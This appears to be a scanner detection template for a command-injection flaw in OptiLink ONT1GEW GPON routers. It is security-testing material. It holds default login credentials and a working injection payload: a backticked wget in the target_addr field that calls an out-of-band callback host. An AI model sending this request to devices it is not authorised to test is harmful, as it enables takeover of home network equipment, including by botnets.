id: optilink-ont1gew-gpon-rce
brief:
    title: OptiLink ONT1GEW GPON Remote Code Execution
    by: gy741
    level: critical
    about: OptiLink is susceptible to remote code execution vulnerabilities which could allow an authenticated, remote attacker to perform command injection attacks against an affected device.
    label:
        - optiLink
        - rce
        - oast
        - mirai
        - packetstorm
        - vuln
    score: CVSS:10.0
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/boaform/admin/formTracert'
      head:
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
        Content-Type: application/x-www-form-urlencoded
        Origin: '{{BaseURL}}'
        Password: e8c
        Referer: '{{BaseURL}}/diag_ping_admin_en.asp'
        User: e8c
      body: target_addr="1.1.1.1+`wget+http%3A%2F%2F{{interactsh-url}}%2F`"&waninf=127.0.0.1"
      signs:
        - "on": word
          has:
            - http
          in: interactsh_protocol
